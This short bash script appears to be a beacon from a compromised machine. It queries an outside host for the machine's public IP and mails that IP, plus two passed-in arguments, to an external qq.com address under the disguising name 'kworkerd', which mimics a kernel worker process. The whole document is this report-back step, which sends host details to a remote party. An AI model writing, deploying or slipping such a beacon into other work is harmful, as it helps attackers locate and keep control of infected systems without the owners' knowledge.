#!/bin/bash

ip=$(curl http://e.epplink.net/ip.php)
echo "kworkerd: $ip $1 $2" | mutt -F /etc/muttrc -s "kworkerd alert: $ip" 2010533525@qq.com
exit 0
